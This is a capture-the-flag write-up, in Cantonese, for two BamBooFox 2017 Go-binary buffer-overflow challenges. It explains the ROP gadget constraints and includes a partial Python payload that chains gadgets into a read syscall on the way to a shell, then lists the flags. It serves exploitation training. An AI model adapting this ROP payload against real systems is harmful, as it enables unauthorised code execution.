# Bamboofox 2017 infant-gogogo & infant-gotoheaven


兩條基本嘅buffer overflow with ROP不過係用golang compile, 算係1 set 向Seccon 2017 babystack致敬嘅題目

由於兩個都係static linked, 所以乜gadget都有,例如syscall, 只要跟住syscall table 汁藥就可以get shell

不過要留意好多gadget 都會對其他register 有operation 

例如 infant-gogogo :

```C
#0x0000000000413d6d : pop rdx ; xor ah, byte ptr [rsi - 9] ; ret
#0x0000000000408437 : pop rsi ; dec dword ptr [rax + 0x21] ; ret
```
所以行呢句gadget 嘅時候要保證related register 唔係=0x0 

例如:
```C
#0x0000000000413d6d : pop rdx ; xor ah, byte ptr [rsi - 9] ; ret
```
就要保證RSI 唔係等於0x0 , 

所以就要去bss 段求其塞d valid memory address去個d 相關register:
For example:
```python
payload="A"*256
#0x0000000000413d6d : pop rdx ; xor ah, byte ptr [rsi - 9] ; ret
#0x0000000000408437 : pop rsi ; dec dword ptr [rax + 0x21] ; ret
buf=0x0052e2a0
rsi=0x0000000000408437
rdx=0x0000000000413d6d
#call read rdi :fd=0 
#rsi:buf 
#rdx:size 
#rax:0x00
payload+=p64(pop_rax_ret)+p64(buf+0x200)
payload+=p64(pop_rdi)+p64(0x0)+p64(rsi)+p64(buf+0x300)
payload+=p64(rdx)+p64(0x8)+p64(pop_rax_ret)+p64(0)+p64(syscall)
```

# Solution :

[infant-gogogo](infant-gogogo.py)


[infant-gotoheaven](infant-gotoheaven.py)


# Flag

```
infant-gogogo: BAMBOOFOX{G0LaNg_iS_aw3s0m3ls!}

infant-gotoheaven : BAMBOOFOX{GOLANG_PWnnnnnnnIng_iS_r3A11Y_W3iRdO_O}

```



# Reference

1. http://shift-crops.hatenablog.com/entry/2017/12/09/200440





